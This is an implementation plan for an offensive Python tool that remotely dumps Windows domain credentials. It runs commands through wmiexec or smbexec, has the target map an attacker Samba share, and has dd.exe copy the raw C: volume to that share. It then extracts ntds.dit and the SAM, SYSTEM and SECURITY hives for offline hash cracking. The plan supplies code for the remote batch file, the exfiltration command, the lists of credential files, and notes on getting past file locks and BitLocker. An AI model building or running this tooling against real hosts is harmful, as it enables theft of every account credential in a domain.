# LastResorNTDS rewrite: implementation plan

**Date:** 2026-10-29
**Updated:** 2026-10-29 (second pass — verified against source)
**Status:** Approved, not started
**Branch:** TBD (create before work begins)

---

## Problem statement

The current script images the entire physical disk of a target host by reading
`\\.\PhysicalDrive0` with `dd.exe`. This approach has two failures:

1. **Wrong offset on Server 2025.** The script runs `fdisk` on the captured
   image and parses its output to find the start sector of the Windows
   partition. The parser reads the wrong field from the `fdisk` output. On
   disks that report different logical and physical sector sizes (512e and
   4Kn layouts, common on Server 2025 VM templates), the computed offset is
   incorrect. The mount fails and no files are extracted.

2. **Full disk transfer is slow and wasteful.** The script copies every byte
   of `\\.\PhysicalDrive0`, which includes the GPT header, the EFI System
   Partition, the Microsoft Reserved Partition, the Recovery Partition, and
   all free space on the C: volume. On a production DC with a 500 GB disk,
   this transfer takes hours and requires 500 GB of free space on the
   attacker machine. Only four files are needed. The rest is discarded.

Both problems trace to the same root: the script reads the physical disk
instead of the volume.

---

## Solution

Read `\\.\C:` instead of `\\.\PhysicalDrive0`. The volume device starts at
the first byte of the NTFS filesystem. It contains no partition table and no
GPT header. The local mount uses offset zero. The `fdisk` parsing, the
sector-size extraction, and the offset math all disappear.

This fix is version-independent. The volume device path works the same on
Server 2019, Server 2022, Server 2025, Windows 10, and Windows 11. It works
on MBR and GPT disks. It works on 512-byte, 512e, and 4Kn sector layouts.

The volume image is smaller than the physical disk image (no EFI, Reserved,
or Recovery partitions), but it is still the full size of C:. A raw block
read is the smallest safe capture method that does not use VSS or an
NTFS-aware file reader. The user chose this tradeoff.

---

## Scope of the rewrite

### In scope

- Switch the `dd.exe` source from `\\.\PhysicalDrive0` to `\\.\C:`.
- Remove the `fdisk` parsing and offset math.
- Support both domain controllers and workstations.
- Support both `wmiexec.py` and `smbexec-shellless.py` as execution methods.
- Allow the user to write loot to any directory, including a mounted remote
  share, through the existing `-loot-output` flag.
- Replace all `os.system()` calls with `subprocess.run()`.
- Update the README.

### Out of scope

- Running `secretsdump` or any hash extraction. The script collects files.
  The user runs `secretsdump` separately with impacket.
- Mounting a remote share on behalf of the user. The user mounts the share
  before running the script and passes the mount point as `-loot-output`.
- Changing the SMB share setup, the credential generation, the interface
  selection, or the teardown logic. These work and stay as they are.
- Changing `wmiexec.py` or `smbexec-shellless.py`. Both are used as-is.

---

## Architecture after the rewrite

```
 Attacker box                          Target host (DC or workstation)
 ─────────────                         ──────────────────────────────
 1. Create Samba share                 
 2. Copy dd.exe + DLLs to share       
 3. Write batch file to share          
 4. Call wmiexec or smbexec ──────────► 5. Mount attacker share as Q:
                                        6. dd.exe if=\\.\C: of=Q:\image.img
                                        7. Disconnect Q:
 8. Mount image.img at offset 0 ◄────── (image sits on attacker share)
 9. Copy target files to loot dir      
10. Unmount image                      
11. Delete image (optional)            
12. Tear down share, user, group       
```

The numbered steps run in order. Steps 5-7 execute on the target host
through the chosen exec method. All other steps run on the attacker box.

---

## Detailed changes by phase

### Phase 1: strip dead code

**Goal:** Remove the functions and logic that compute the partition offset.
These are the direct cause of the Server 2025 failure.

**Delete these functions entirely:**

1. `run_fdisk(image_path)` — Lines that call `sudo fdisk --bytes -l` on the
   image and write the output to `/tmp/fdisk_output.txt`. This function
   exists only to feed `parse_fdisk_output`. With no offset to compute,
   both are dead code.

2. `parse_fdisk_output(output)` — Lines that parse the `fdisk` output to
   extract the sector size and the start sector of the largest partition.
   This is the function that reads the wrong field index and breaks on
   Server 2025. It also uses a fragile substring match
   (`line.find(largest_number)`) that can match the wrong line if two
   partitions share a digit sequence. Both bugs go away by deleting the
   function.

**Delete from `main()`:**

3. The call `fdisk_output = run_fdisk(image_path)`.
4. The call `sector_size, start_byte = parse_fdisk_output(fdisk_output)`.
5. The line `offset = start_byte * sector_size`.
6. The line `mount_command = f'sudo mount -o loop,offset={offset} ...'`.
7. The `os.system(mount_command)` call that uses the computed offset.
8. The print statement `f'Largest partition mounted to {mount_dir} with
   offset {offset}'`.

**Do not delete:**

- `mount_image()` — This function stays but changes in Phase 5.
- `unmount_image()` — Unchanged.
- `create_temp_mount()` — Unchanged.
- `copy_files()` — Changes in Phase 6.

**Commit message:** `Remove fdisk parsing and offset math`

---

### Phase 2: update argparse arguments

**Goal:** Add flags for the new features. Keep all existing flags.

**Add these new arguments:**

1. `-mode`
   - Type: `str`, choices `['dc', 'workstation']`
   - Default: `dc`
   - Help text: `Target type. "dc" grabs ntds.dit, SYSTEM, SAM, and
     SECURITY. "workstation" grabs SYSTEM, SAM, SECURITY, and their
     .LOG1/.LOG2 transaction logs.`
   - Stored as: `args.mode`

2. `-exec-method`
   - Type: `str`, choices `['wmiexec', 'smbexec']`
   - Default: `wmiexec`
   - Help text: `Remote execution method. "wmiexec" uses wmiexec.py.
     "smbexec" uses smbexec-shellless.py.`
   - Stored as: `args.exec_method`

3. `-volume`
   - Type: `str`
   - Default: `C:`
   - Help text: `Target volume on the remote host. Change this if ntds.dit
     lives on a different volume, for example D:.`
   - Stored as: `args.volume`

4. `-no-cleanup-image`
   - Type: `store_true` (boolean flag)
   - Default: `False` (meaning the image is deleted by default)
   - Help text: `Keep the raw volume image after file extraction. By default
     the image is deleted to free disk space.`
   - Stored as: `args.no_cleanup_image`

**Existing arguments that stay unchanged:**

- `target` — positional, the `[[domain/]username[:password]@]<target>` string.
- `-silent` — suppresses banner output.
- `-share` — the remote share to read from (default `C$`). Note: this is
  the share on the target for reading, not the attacker share.
- `-ts` — timestamp on log output.
- `-debug` — debug output.
- `-unsafe-exec` — continue if a drive letter is in use.
- `-shell-type` — `cmd` or `powershell`.
- `-sharename` — attacker share name override.
- `-shareuser` — attacker share user override.
- `-sharepassword` — attacker share password override.
- `-sharegroup` — attacker share group override.
- `-ip` — attacker IP or interface.
- `-loot-output` — custom loot directory path. This is the flag that lets
  the user write to a mounted remote share. No new flag is needed.
- `-dc-ip` — domain controller IP.
- `-target-ip` — target machine IP.
- `-port` — destination port (139 or 445).
- `-hashes` — NTLM hashes.
- `-localauth` — local account authentication.
- `-no-pass` — skip password prompt.
- `-k` — Kerberos authentication.
- `-aesKey` — AES key for Kerberos.
- `-keytab` — keytab file path.

**Commit message:** `Add -mode, -exec-method, -volume, -no-cleanup-image flags`

---

### Phase 3: change the remote dd command

**Goal:** Read the volume device instead of the physical disk.

**Current code that builds the batch file:**

```python
with open(f'/var/tmp/{share_name}/tempbat.bat', 'w') as f:
    f.write(f'Q:\\dd\\dd.exe if=\\\\.\\Physicaldrive0 of=Q:\\image.img bs=16M  \n net use Q: /delete /yes')
    f.close()
```

**New code:**

```python
volume = args.volume  # default "C:"
with open(f'/var/tmp/{share_name}/tempbat.bat', 'w') as f:
    f.write(f'Q:\\dd\\dd.exe if=\\\\.\\{volume} of=Q:\\image.img bs=16M\r\n')
    f.write(f'net use Q: /delete /yes\r\n')
```

**Changes:**

1. Replace `Physicaldrive0` with `{volume}`, which defaults to `C:` and is
   overridden by the `-volume` flag.
2. Use `\r\n` (Windows line endings) instead of `\n` with leading spaces.
   The current batch file has a space before `net use`, which is harmless
   but sloppy. Clean it up.
3. Remove the redundant `f.close()`. The `with` block closes the file.

**What this means on the target:**

- `dd.exe if=\\.\C: of=Q:\image.img bs=16M` reads every sector of the C:
  volume. The first byte of the output is the first byte of the NTFS
  filesystem. There is no partition table, no GPT header, and no EFI
  partition in the output.
- The image file size equals the size of the C: volume, not the whole disk.
- The file lock on `ntds.dit` does not block this read. The lock is at the
  filesystem level. A raw volume read operates below the filesystem.

**Commit message:** `Change dd source from PhysicalDrive0 to volume device`

---

### Phase 4: add exec-method routing

**Goal:** Let the user choose between `wmiexec.py` and `smbexec-shellless.py`
for remote command execution.

**Current code in `main()` that calls `wmiexec`:**

```python
if args.hashes != None:
    os.system(f'python wmiexec.py {hasheshash} {domain}/{username}@{remoteName}  \'{command}\'')
else:
    os.system(f'python wmiexec.py {domain}/{username}:{password}@{remoteName}  \'{command}\'')
```

**New code:**

Create a function `execute_remote(args, domain, username, password, remoteName, hashes, command)` that builds and runs the correct command based on `args.exec_method`.

```python
def execute_remote(exec_method, domain, username, password, remote_name,
                   hashes, command):
    """
    Run a command on the remote host through the chosen execution method.

    Args:
        exec_method: 'wmiexec' or 'smbexec'
        domain: target domain
        username: authentication username
        password: authentication password
        remote_name: target hostname or IP
        hashes: NTLM hash string or None
        command: the command string to execute remotely

    Returns:
        subprocess.CompletedProcess
    """
```

**For `wmiexec`:** build the command line the same way the current code does,
but use `subprocess.run()` instead of `os.system()`. Pass the command as a
list, not a shell string, to avoid quoting bugs.

**For `smbexec`:** read `smbexec-shellless.py` to determine its argument
format. It likely follows the same impacket convention:
`smbexec-shellless.py [domain/]username[:password]@target 'command'`.
Build the command line to match. Test both code paths.

**Important:** the current code builds the hash argument as
`f'-hashes \'{args.hashes}\''` with nested quotes. This is fragile with
`os.system`. When switching to `subprocess.run` with a list, pass `-hashes`
and the hash value as separate list elements. No shell quoting needed.

**Commit message:** `Add -exec-method flag for wmiexec and smbexec`

---

### Phase 5: simplify the local mount

**Goal:** Mount the volume image at offset zero with read-only protection.

**Current `mount_image` function:**

```python
def mount_image(image_path, mount_dir):
    os.system(f'sudo mount -o loop {image_path} {mount_dir}')
```

This function is called from `main()` after the offset is computed, using a
separate `mount_command` that includes the offset. The function itself is
not used with the offset. The offset mount is an inline `os.system` call.

**New `mount_image` function:**

```python
def mount_image(image_path, mount_dir):
    """
    Mount a raw NTFS volume image at the given directory.

    The image is a raw read of a volume device (e.g. \\.\C:), so the
    first byte is the start of the NTFS filesystem. No partition table
    is present. The offset is zero.

    The image is mounted read-only to preserve the captured state.

    Args:
        image_path: absolute path to the .img file
        mount_dir: absolute path to the mount point directory

    Returns:
        True if the mount succeeded, False otherwise.
    """
    result = subprocess.run(
        ['sudo', 'mount', '-o', 'loop,ro', image_path, mount_dir],
        capture_output=True, text=True
    )
    if result.returncode != 0:
        print(f'{red_minus} Mount failed: {result.stderr.strip()}')
        return False
    print(f'{green_plus} Mounted {image_path} at {mount_dir} (read-only)')
    return True
```

**Changes from current behavior:**

1. Add `-o ro` to the mount options. The image is evidence. Do not allow
   writes to it. The current code mounts read-write, which can modify the
   NTFS journal on the captured image.
2. Use `subprocess.run` instead of `os.system`.
3. Return a boolean so the caller can handle mount failure instead of
   continuing blindly.
4. Remove the offset mount from `main()`. Call `mount_image()` directly.

**Delete from `main()`:**

The inline mount command and the offset variable. Replace with:

```python
if not mount_image(image_path, mount_dir):
    print(f'{red_minus} Cannot mount the volume image. Exiting.')
    sys.exit(1)
```

**Commit message:** `Simplify mount to offset zero, read-only`

---

### Phase 6: rewrite file extraction

**Goal:** Copy the correct files based on the target mode (DC or
workstation). Print file sizes during copy.

**Current `copy_files` function:**

```python
def copy_files(mount_dir, loot_dir):
    files_to_copy = [
        'Windows/System32/config/SYSTEM',
        'Windows/System32/config/SECURITY',
        'Windows/System32/config/SAM',
        'Windows/NTDS/ntds.dit'
    ]
    for relative_path in files_to_copy:
        src = os.path.join(mount_dir, relative_path)
        name = relative_path.split('/')[-1]
        dest = os.path.join(loot_dir, name)
        if os.path.exists(src):
            shutil.copy(src, dest)
            print(f'Copied {src} to {dest}')
        else:
            print(f'File {src} not found')
```

**New `copy_files` function:**

```python
# File lists by mode
DC_FILES = [
    'Windows/NTDS/ntds.dit',
    'Windows/System32/config/SYSTEM',
    'Windows/System32/config/SAM',
    'Windows/System32/config/SECURITY',
]

WORKSTATION_FILES = [
    'Windows/System32/config/SYSTEM',
    'Windows/System32/config/SYSTEM.LOG1',
    'Windows/System32/config/SYSTEM.LOG2',
    'Windows/System32/config/SAM',
    'Windows/System32/config/SAM.LOG1',
    'Windows/System32/config/SAM.LOG2',
    'Windows/System32/config/SECURITY',
    'Windows/System32/config/SECURITY.LOG1',
    'Windows/System32/config/SECURITY.LOG2',
]

# Files that are required (fail if missing) vs optional (warn if missing)
OPTIONAL_SUFFIXES = ['.LOG1', '.LOG2']


def copy_files(mount_dir, loot_dir, mode):
    """
    Copy target files from the mounted volume image to the loot directory.

    Args:
        mount_dir: path where the volume image is mounted
        loot_dir: path where extracted files are written
        mode: 'dc' or 'workstation'

    Returns:
        list of file names that were copied successfully
    """
    file_list = DC_FILES if mode == 'dc' else WORKSTATION_FILES
    copied = []

    for relative_path in file_list:
        src = os.path.join(mount_dir, relative_path)
        name = os.path.basename(relative_path)
        dest = os.path.join(loot_dir, name)
        is_optional = any(name.endswith(s) for s in OPTIONAL_SUFFIXES)

        if os.path.exists(src):
            size = os.path.getsize(src)
            shutil.copy2(src, dest)
            size_mb = size / (1024 * 1024)
            print(f'{green_plus} Copied {name} ({size_mb:.1f} MB) to {dest}')
            copied.append(name)
        elif is_optional:
            print(f'{gold_plus} Optional file not found, skipping: {name}')
        else:
            print(f'{red_minus} Required file not found: {src}')

    return copied
```

**Changes from current behavior:**

1. Accept a `mode` parameter. Choose the file list based on mode.
2. `.LOG1` and `.LOG2` files are optional. If absent, print a warning and
   continue. Do not fail. These files do not exist on every system.
3. Required files (the hive files and `ntds.dit`) print an error if missing.
   The script does not abort, because the other files may still be useful.
4. Print the file size in MB for each copied file. This gives the user
   visibility into what was collected and how large each file is.
5. Use `shutil.copy2` instead of `shutil.copy`. `copy2` preserves the file
   metadata (timestamps). This matters for forensic use.
6. Return the list of copied file names so the caller can report a summary.

**Commit message:** `Add mode-aware file extraction with DC and workstation lists`

---

### Phase 7: update the cleanup block

**Goal:** Clean up the volume image, the loop device, and the share folder.
Stop dragging the full share folder into the repo directory.

**Current cleanup in the `finally` block:**

```python
finally:
    unmount_image('/tmp/tmpmount')
    # stop smbd
    # restore smb.conf
    # delete backup smb.conf
    # delete user
    # delete group
    # move entire share folder to cwd  <-- THIS IS THE PROBLEM
```

The last step runs `sudo mv /var/tmp/{share_name} {cwd}`. This moves the
share folder, which contains the multi-gigabyte `image.img`, into the repo
directory. It fills the disk and leaves a huge file in the project tree.

**New cleanup block:**

```python
finally:
    # 1. Unmount the volume image
    unmount_image('/tmp/tmpmount')

    # 2. Delete the volume image (unless -no-cleanup-image)
    if not args.no_cleanup_image:
        image_path = f'/var/tmp/{share_name}/image.img'
        if os.path.exists(image_path):
            os.remove(image_path)
            print(f'{green_plus} Deleted volume image: {image_path}')

    # 3. Detach any loop device that may have leaked
    # Find loop devices backed by our image and detach them
    result = subprocess.run(
        ['losetup', '-j', f'/var/tmp/{share_name}/image.img'],
        capture_output=True, text=True
    )
    if result.stdout.strip():
        for line in result.stdout.strip().split('\n'):
            loop_dev = line.split(':')[0]
            subprocess.run(['sudo', 'losetup', '-d', loop_dev])
            print(f'{green_plus} Detached loop device: {loop_dev}')

    # 4. Stop the smbd service
    subprocess.run(['sudo', 'systemctl', 'stop', 'smbd'],
                   capture_output=True)
    print(f'{green_plus} Stopped the smbd service')

    # 5. Restore the original smb.conf
    smb_backup = os.path.join(cwd, 'smb.conf')
    if os.path.exists(smb_backup):
        subprocess.run(['sudo', 'cp', smb_backup, '/etc/samba/smb.conf'],
                       capture_output=True)
        print(f'{green_plus} Restored the smb.conf file')
        os.remove(smb_backup)

    # 6. Delete the share user and group
    subprocess.run(['sudo', 'userdel', share_user], capture_output=True)
    print(f'{green_plus} Removed the user: {share_user}')

    subprocess.run(['sudo', 'groupdel', share_group], capture_output=True)
    print(f'{green_plus} Removed the group: {share_group}')

    # 7. Delete the share folder (not move it)
    share_path = f'/var/tmp/{share_name}'
    if os.path.exists(share_path):
        shutil.rmtree(share_path)
        print(f'{green_plus} Deleted share folder: {share_path}')

    print(f'{green_plus} Cleanup complete')
```

**Changes from current behavior:**

1. Delete `image.img` instead of moving it. The loot files are already
   copied to the loot directory. The image is no longer needed.
2. Add `losetup -d` to detach leaked loop devices. A leaked device holds
   the image file open and blocks deletion.
3. Delete the share folder with `shutil.rmtree` instead of moving it into
   `cwd`. No multi-gigabyte folder lands in the project tree.
4. Add the `-no-cleanup-image` flag check. If set, the image is kept in
   the share folder (which is also kept in that case).
5. Replace all `os.system` calls in the cleanup with `subprocess.run`.
6. Remove the bare `except BaseException` blocks that silently swallow
   errors. Each cleanup step runs independently. If one fails, the rest
   still execute. Print the error instead of hiding it.
7. Remove `sys.exit(0)` from the end of the `finally` block. Let the
   script exit naturally. `sys.exit` in a `finally` block masks exceptions.

**Commit message:** `Rewrite cleanup: delete image, detach loops, remove share folder`

---

### Phase 8: replace os.system throughout

**Goal:** Every shell command uses `subprocess.run` with return-code checks.

**Why:** `os.system()` runs a command through the shell and returns the exit
code, but the current code never checks it. Every `os.system` call in the
script ignores failures silently. `subprocess.run` returns a
`CompletedProcess` object with `returncode`, `stdout`, and `stderr`.

**Functions to update:**

1. `setup_share()` — 9 calls to `os.system` for `mkdir`, `cp`, `groupadd`,
   `useradd`, `chown`, `chmod`, `systemctl restart`. Replace each with
   `subprocess.run`. Check the return code. Print an error and exit if a
   critical step fails (user creation, password set, service restart).

2. `main()` — the `os.system` calls for `chmod` on the dd files, `cat` on
   the batch file, and the `wmiexec`/`smbexec` execution. Replace with
   `subprocess.run`.

3. The `finally` block — already replaced in Phase 7.

**Pattern to follow:**

```python
# Before
os.system(f'sudo mkdir /var/tmp/{share_name}')

# After
result = subprocess.run(
    ['sudo', 'mkdir', f'/var/tmp/{share_name}'],
    capture_output=True, text=True
)
if result.returncode != 0:
    print(f'{red_minus} Failed to create share directory: {result.stderr.strip()}')
    sys.exit(1)
```

**Commit message:** `Replace os.system with subprocess.run throughout`

---

### Phase 9: update README.md

**Goal:** Document the new flags, both modes, both exec methods, and the
loot-output usage for remote storage.

**New README structure:**

```
# LastResorNTDS

Remote collection of Windows credential files from domain controllers and
workstations. Uses dd.exe to capture the target volume and extracts NTDS,
SAM, SYSTEM, and SECURITY hive files.

## Requirements

- Python 3.6+
- impacket
- netifaces
- Samba (smbd) installed on the attacker box
- sudo access on the attacker box

## Usage

### Domain controller (default)

<example command for DC mode>

### Workstation

<example command for workstation mode with -mode workstation>

### Using smbexec instead of wmiexec

<example command with -exec-method smbexec>

### Writing loot to a remote share

<explanation: mount the share first, then pass -loot-output /mnt/remote>

### Non-default NTDS volume

<example command with -volume D:>

### Authentication options

<examples for password, hash, kerberos, keytab, local auth>

## Arguments

<full argument table>

## How it works

<numbered steps matching the architecture diagram>

## Files collected

### DC mode
- ntds.dit
- SYSTEM
- SAM
- SECURITY

### Workstation mode
- SYSTEM, SYSTEM.LOG1, SYSTEM.LOG2
- SAM, SAM.LOG1, SAM.LOG2
- SECURITY, SECURITY.LOG1, SECURITY.LOG2

## Post-collection

Run esentutl /p on ntds.dit on a Windows box to repair the crash-consistent
database before using secretsdump.

Run secretsdump.py separately with impacket. This script does not extract
hashes.

## Cleanup

The script cleans up automatically: stops smbd, restores smb.conf, removes
the share user and group, deletes the share folder and the volume image.

## Files in this repository

- LastResorNTDS.py — main script
- wmiexec.py — WMI-based remote execution (impacket)
- smbexec-shellless.py — SMB-based remote execution (impacket, shellless)
- dd.exe — Windows dd binary
- msys-2.0.dll — dd.exe dependency
- msys-iconv-2.dll — dd.exe dependency
- msys-intl-8.dll — dd.exe dependency
```

**Commit message:** `Update README with new usage and flags`

---

## Commit sequence

Each phase is one commit. The commits apply in order. Any commit can be
reverted independently without breaking the others, except that Phase 1
(strip dead code) and Phase 5 (simplify mount) must ship together.

| Order | Phase | Commit message |
|---|---|---|
| 1 | Phase 1 | `Remove fdisk parsing and offset math` |
| 2 | Phase 2 | `Add -mode, -exec-method, -volume, -no-cleanup-image flags` |
| 3 | Phase 3 | `Change dd source from PhysicalDrive0 to volume device` |
| 4 | Phase 4 | `Add -exec-method flag for wmiexec and smbexec` |
| 5 | Phase 5 | `Simplify mount to offset zero, read-only` |
| 6 | Phase 6 | `Add mode-aware file extraction with DC and workstation lists` |
| 7 | Phase 7 | `Rewrite cleanup: delete image, detach loops, remove share folder` |
| 8 | Phase 8 | `Replace os.system with subprocess.run throughout` |
| 9 | Phase 9 | `Update README with new usage and flags` |

---

## Risk register

### Volume device access

`dd.exe` opening `\\.\C:` requires administrator privileges on the target.
The current method requires the same privileges for `\\.\PhysicalDrive0`.
No change in access requirements.

### Crash-consistent ntds.dit

The captured `ntds.dit` is a live copy. It may have uncommitted transactions.
Run `esentutl /p ntds.dit` on a Windows box to repair it before running
`secretsdump`. This is the same requirement as the current method. It is not
a regression.

### Large volume images

The C: volume image is smaller than the full disk image, but it is still the
size of C:. A 200 GB C: volume produces a 200 GB image. The user must have
enough disk space on the attacker box (or on a mounted remote share passed
to `-loot-output`). The script does not compress the image.

### BitLocker

On a BitLocker-encrypted host, reading `\\.\C:` returns plaintext sectors
because the BitLocker driver decrypts above the volume device. Reading
`\\.\PhysicalDrive0` returns ciphertext. The new method works better on
BitLocker hosts. This is an improvement.

### Non-default NTDS path

Some domain controllers store `ntds.dit` on a volume other than C:, for
example `D:\NTDS`. The `-volume` flag handles this. The user must know the
target volume letter. A future enhancement could query the NTDS path from
the registry automatically.

### smbexec argument format

The `smbexec-shellless.py` script may not accept the same argument format as
`wmiexec.py`. Read the script and confirm the argument parsing before
implementing Phase 4. If the format differs, build the command line
accordingly.

### Transaction log files

The `.LOG1` and `.LOG2` files are small (typically under 1 MB each). They do
not exist on every system. The script treats them as optional and skips them
with a warning if absent.

---

## Bugs found during plan review (second pass)

These are bugs in the **current** code that the rewrite must fix. They are
not new issues introduced by the plan.

### Bug 1: Kerberos auth flags not forwarded to wmiexec

The current code calls wmiexec like this:

```python
os.system(f'python wmiexec.py {domain}/{username}:{password}@{remoteName}  \'{command}\'')
```

It does **not** pass `-k`, `-aesKey`, `-dc-ip`, `-target-ip`, `-port`, or
`-keytab` to wmiexec. If the user runs LastResorNTDS with `-k -no-pass`,
the main script accepts the args and loads the keytab, but wmiexec never
receives them. Kerberos authentication is broken.

**Fix in Phase 4:** the `execute_remote()` function must forward all auth
and connection flags to whichever exec tool is selected. The full list:

- `-hashes` (already forwarded, but with broken quoting)
- `-k` (not forwarded)
- `-aesKey` (not forwarded)
- `-dc-ip` (not forwarded)
- `-target-ip` (not forwarded)
- `-port` (not forwarded)
- `-keytab` (not forwarded — note: keytab content is loaded locally by
  LastResorNTDS, but `-k` still needs to reach the exec tool)

### Bug 2: Password validation blocks Kerberos-only auth

```python
if not password and not hashes:
    parser.error('You must provide either a password or NTLM hashes.')
```

This rejects `-k -no-pass`, which is the standard Kerberos ccache flow.

**Fix in Phase 2:** change the validation to also allow `-k` or `-aesKey`:

```python
if not password and not hashes and not args.k and not args.aesKey:
    parser.error('You must provide a password, NTLM hashes, or Kerberos auth (-k or -aesKey).')
```

### Bug 3: `-share` flag is dead code

```python
parser.add_argument('-share', action='store', default='C$', ...)
```

`args.share` is never referenced in `main()`. It is never passed to
wmiexec. wmiexec defaults to `ADMIN$` for its output share. The user's
`-share` flag has no effect.

**Fix in Phase 4:** pass `-share` through to the exec tool. Note the
default difference:

- `wmiexec.py` defaults to `ADMIN$`
- `smbexec-shellless.py` defaults to `C$`

The main script defaults to `C$`. Forward it explicitly so both tools
use the same share.

### Bug 4: Unused imports

These imports in `LastResorNTDS.py` are never used:

- `time` (line 2)
- `re` (line 4)
- `logging` (line 10) — `logging.basicConfig` is called but no logger
  is used in the script's own functions
- `smbserver` from impacket (line 17)
- `transport` from impacket (line 18)
- `scmr` from impacket (line 18)
- `version` from impacket (line 17)
- `logger` from impacket (line 15)

**Fix in Phase 8:** remove unused imports. Keep `logging` only if we add
proper logging.

---

## smbexec-shellless.py: argument format analysis

The plan originally said "it likely follows the same impacket convention."
After reading the source, here are the exact differences from wmiexec.py.
Phase 4 must account for all of them.

### Command argument

- `wmiexec.py`: `command` uses `nargs='*'`, collects multiple positional
  args, joins them with a space. Can run interactively if no command given.
- `smbexec-shellless.py`: `command` uses `action='store'`, takes a single
  positional string. Must be quoted on the command line.

Both accept the command as the second positional argument after `target`.
Both work when the command is passed as a single quoted string, which is
how the current code calls wmiexec. No change needed for command passing.

### Default output share

- `wmiexec.py`: `-share` defaults to `ADMIN$`
- `smbexec-shellless.py`: `-share` defaults to `C$`

Both use this share to write and read a temporary output file. This is
**not** the attacker's Samba share. The attacker share is mounted via
`net use` in the remote command.

### Extra flags on smbexec-shellless.py

- `-service-name`: custom service name for the SCM-based execution.
  Default is random. Do not forward from the main script. Let smbexec
  generate its own.
- `-unsafe-exec`: same flag exists on the main script. Forward it.
- `-codec`: character encoding for output. Forward if present.

### Extra flags on wmiexec.py

- `-nooutput`: do not read output. Not needed.
- `-silentcommand`: run without cmd.exe wrapper. Not needed.
- `-com-version`: DCOM version. Not needed.
- `-A`: auth file. Not needed.

### Global variable usage in smbexec-shellless.py

`smbexec-shellless.py` reads `command` and `options` as module-level
globals inside `RemoteShell.__init__()`. This means it must be called as
a script (via subprocess), not imported. The plan already calls it via
subprocess, so this is not a problem.

### How smbexec handles `&&` in commands

`smbexec-shellless.py` splits the command on `&&` and `&` (lines 145-157)
and executes each part as a separate Windows service. The current remote
command is:

```
net use Q: \\{ip}\{share} /user:{user} {pass} && Q:\tempbat.bat
```

smbexec splits this into two separate service executions:
1. `net use Q: \\{ip}\{share} /user:{user} {pass}`
2. `Q:\tempbat.bat`

This works because `net use` creates a system-wide drive mapping that
persists across service executions. If the first command fails and
`-unsafe-exec` is not set, smbexec skips the second command (line 161).
This is the correct behavior.

**Important:** the `-unsafe-exec` flag on the main script must be
forwarded to smbexec-shellless.py so this safety check works. wmiexec
does not have this flag and does not need it (it runs the entire command
as one process via WMI).

---

## Corrections to the original plan

### Phase 2 correction: password validation

Add the Kerberos auth fix (Bug 2 above) to Phase 2. Change the validation
to accept `-k` or `-aesKey` as alternatives to password and hashes.

### Phase 4 correction: full auth forwarding

The `execute_remote()` function must accept and forward all auth flags,
not just hashes and password. Updated signature:

```python
def execute_remote(exec_method, domain, username, password, remote_name,
                   hashes, command, kerberos=False, aes_key=None,
                   dc_ip=None, target_ip=None, port='445', share='C$',
                   unsafe_exec=False):
```

**For wmiexec, build this command:**

```python
cmd = [sys.executable, os.path.join(cwd, 'wmiexec.py')]
if hashes:
    cmd.extend(['-hashes', hashes])
if kerberos:
    cmd.append('-k')
if aes_key:
    cmd.extend(['-aesKey', aes_key])
if dc_ip:
    cmd.extend(['-dc-ip', dc_ip])
if target_ip:
    cmd.extend(['-target-ip', target_ip])
cmd.extend(['-share', share])

# Build target string
if hashes or kerberos:
    target_str = f'{domain}/{username}@{remote_name}'
else:
    target_str = f'{domain}/{username}:{password}@{remote_name}'

cmd.append(target_str)
cmd.append(command)
```

**For smbexec, build this command:**

```python
cmd = [sys.executable, os.path.join(cwd, 'smbexec-shellless.py')]
if hashes:
    cmd.extend(['-hashes', hashes])
if kerberos:
    cmd.append('-k')
if aes_key:
    cmd.extend(['-aesKey', aes_key])
if dc_ip:
    cmd.extend(['-dc-ip', dc_ip])
if target_ip:
    cmd.extend(['-target-ip', target_ip])
if port:
    cmd.extend(['-port', port])
cmd.extend(['-share', share])
if unsafe_exec:
    cmd.append('-unsafe-exec')

# Build target string (same as wmiexec)
if hashes or kerberos:
    target_str = f'{domain}/{username}@{remote_name}'
else:
    target_str = f'{domain}/{username}:{password}@{remote_name}'

cmd.append(target_str)
cmd.append(command)
```

### Phase 7 correction: cleanup with `-no-cleanup-image`

The original cleanup code has a logic error. Step 7 deletes the share
folder unconditionally, but the plan text says the image should be
preserved when `-no-cleanup-image` is set. Fix:

When `-no-cleanup-image` is set:
1. Move the image from the share folder to the loot directory.
2. Then delete the share folder.
3. Print the image location so the user knows where to find it.

```python
if args.no_cleanup_image:
    image_src = f'/var/tmp/{share_name}/image.img'
    image_dest = os.path.join(loot_dir, 'image.img')
    if os.path.exists(image_src):
        shutil.move(image_src, image_dest)
        print(f'{green_plus} Moved volume image to: {image_dest}')
else:
    image_path = f'/var/tmp/{share_name}/image.img'
    if os.path.exists(image_path):
        os.remove(image_path)
        print(f'{green_plus} Deleted volume image: {image_path}')

# Now safe to delete the share folder in both cases
share_path = f'/var/tmp/{share_name}'
if os.path.exists(share_path):
    shutil.rmtree(share_path)
    print(f'{green_plus} Deleted share folder: {share_path}')
```

### Phase 8 addition: remove unused imports

Add this step to Phase 8. Remove these unused imports:

```python
# DELETE these lines:
import time
import re
from impacket.examples import logger
from impacket import version, smbserver
from impacket.dcerpc.v5 import transport, scmr
```

Keep these (still used):

```python
import subprocess
import os
import shutil
import argparse
from datetime import datetime
import random
import string
import logging          # keep if we add proper logging
import sys
import socket
import errno
import netifaces as ni
from impacket.examples.utils import parse_target
from impacket.krb5.keytab import Keytab
```

### Phase 5 addition: ntfs-3g dependency

Mounting an NTFS image on Linux requires the `ntfs-3g` package (or the
kernel `ntfs3` module on Linux 5.15+). The `mount` command auto-detects
NTFS and calls the correct driver, but the driver must be installed.

Add `ntfs-3g` to the requirements in the README (Phase 9). Add a check
in `mount_image()` that prints a clear error if the mount fails with
"unknown filesystem type 'ntfs'".

### Phase 6 addition: DC mode should also include .LOG files

The DC file list should also include the registry hive .LOG files. The
hives are locked on a DC the same way they are on a workstation. A
crash-consistent copy benefits from the same transaction logs.

Updated file lists:

**DC mode:**
```python
DC_FILES = [
    'Windows/NTDS/ntds.dit',
    'Windows/System32/config/SYSTEM',
    'Windows/System32/config/SYSTEM.LOG1',
    'Windows/System32/config/SYSTEM.LOG2',
    'Windows/System32/config/SAM',
    'Windows/System32/config/SAM.LOG1',
    'Windows/System32/config/SAM.LOG2',
    'Windows/System32/config/SECURITY',
    'Windows/System32/config/SECURITY.LOG1',
    'Windows/System32/config/SECURITY.LOG2',
]
```

**Workstation mode:** unchanged (same list minus `ntds.dit`).

---

## Updated requirements list (for README)

- Python 3.6+
- impacket (for `parse_target` and `Keytab`)
- netifaces
- Samba (`smbd`) installed on the attacker box
